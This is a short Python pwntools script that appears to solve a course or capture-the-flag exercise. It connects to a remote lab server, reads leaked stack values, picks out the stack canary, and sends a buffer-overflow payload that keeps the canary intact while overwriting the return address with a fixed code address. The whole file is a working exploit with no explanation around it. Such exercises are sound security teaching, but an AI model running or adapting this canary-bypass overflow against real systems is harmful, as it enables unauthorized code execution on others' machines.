from pwn import *

io = remote('inf226.puffling.no', 6102)
io.sendline('-s')

canaries = []
for a in range(10):
    canaries.append(io.recvline())

canary = p64(int(canaries[4], 16))

payload = cyclic(8) + canary + cyclic(8) + p64(0x401216)

io.send(payload)

io.shutdown('out')

print(io.readall())


